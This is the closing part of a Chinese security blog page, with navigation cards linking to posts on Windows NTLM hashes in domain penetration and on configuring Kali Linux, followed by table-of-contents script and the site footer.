            <div class="article-badge left-badge text-color">本篇</div>
            <div class="card">
                <a href="/yu-shen-tou-zhi-ntml-hash/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="域渗透之NTML-Hash">
                        
                        <span class="card-title">域渗透之NTML-Hash</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">一、认识Windows HASH​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-03
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/攻防渗透/" class="post-category" target="_blank">
                                    攻防渗透
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/内网渗透/" target="_blank">
                        <span class="chip bg-color">内网渗透</span>
                    </a>
                    
                    <a href="/tags/域渗透/" target="_blank">
                        <span class="chip bg-color">域渗透</span>
                    </a>
                    
                    <a href="/tags/NTML-Hash/" target="_blank">
                        <span class="chip bg-color">NTML-Hash</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">下一篇</div>
            <div class="card">
                <a href="/kali-rolling-an-zhuang-zhi-hou-de-yi-xie-chang-yong-pei-zhi-zong-jie/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="kali Rolling安装之后的一些常用配置总结">
                        
                        <span class="card-title">kali Rolling安装之后的一些常用配置总结</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">添加普通用户
useradd -m -G sudo,video,audio,cdrom -s /bin/bash ssooking

把某个用户添加到组中: sudo usermod -a 用户名 -G 组名递归更改目录/文件所属用户组： </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-23
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/神兵利器/" class="post-category" target="_blank">
                                    神兵利器
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/kali/" target="_blank">
                        <span class="chip bg-color">kali</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>
    </div>
    <div class="col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title">目录</div>
            <div id="toc-content">

            </div>
        </div>
    </div>
</div>

<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingSelector: 'h1, h2, h3'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });
    });
</script>
    

</main>

<footer class="page-footer bg-color">
    <div class="container row center-align">
       <div class="col s12 m8 l8 copy-right">
            copyright &copy; <a href="https://ssooking.github.io/" target="_blank">ssooking</a>. 关注安全动态，分享优质文章！
        </div>

        <div class="col s12 m4 l4 social-link"><a href="https://github.com/ssooking" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
    <i class="fa fa-github"></i>
</a>
<a href="mailto:ssooking@yeah.net" class="tooltipped" target="_blank" data-tooltip="mail：ssooking@yeah.net" data-position="top" data-delay="50">
    <i class="fa fa-envelope-open"></i>
</a>



<a href="https://join.skype.com/invite/PWgoTe4YvrbH" class="tooltipped" target="_blank" data-tooltip="skype：ssooking" data-position="top" data-delay="50">
    <i class="fa fa-skype"></i>
</a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


<!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title">搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字" class="search-input" autofocus>
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
</script>
<!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>



<script src="/libs/materialize/js/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>
</body>
</html>